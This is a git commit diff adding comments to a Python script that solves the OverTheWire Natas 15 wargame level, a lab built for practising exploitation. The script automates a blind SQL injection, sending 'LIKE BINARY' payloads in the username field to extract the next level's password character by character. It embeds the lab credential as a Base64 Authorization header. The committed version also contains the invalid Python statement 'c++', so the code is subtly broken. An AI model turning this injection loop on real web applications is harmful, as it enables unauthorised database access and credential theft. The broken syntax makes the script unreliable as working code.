7c1152806e48316964f28000b8d50f9a033afafb
Keegan Volk <145498356+keeganvolk@users.noreply.github.com>
2025-09-16 12:20:38 -0500

    add comments

--- 1.py
+++ 1.py
@@ -1,14 +1,16 @@
-import requests					#i woulda made this better but i needa study so jus
-from requests.auth import HTTPBasicAuth		#let it go til it stops finding new characters in it
-chars='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
-auth=HTTPBasicAuth('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
-pw='T'
-c=0
-while c<1:
+import requests
+from requests.auth import HTTPBasicAuth
+chars='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890' #List of possible characters
+auth=HTTPBasicAuth('natas15','') #Credentials to access the page/send the request, add the password for natas15 in the second parameter
+pw='' #String to store the found correct password characters
+c=0 #Number of correct password characters found
+print()
+while c<32:
 	for i in chars:
-		val= 'natas16" and password LIKE BINARY "'+pw+i+'%"; #'
+		val= 'natas16" and password LIKE BINARY "'+pw+i+'%"; #' #SQL payload
 		dat={'username':val}
 		req=requests.post('http://natas15.natas.labs.overthewire.org/index.php',data=dat,auth=auth,headers={"Authorization":"Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=="})
 		if "This user exists" in str(req.content):
 			pw=pw+i
-			print(pw)
+			print("\b" + i)
+			c++
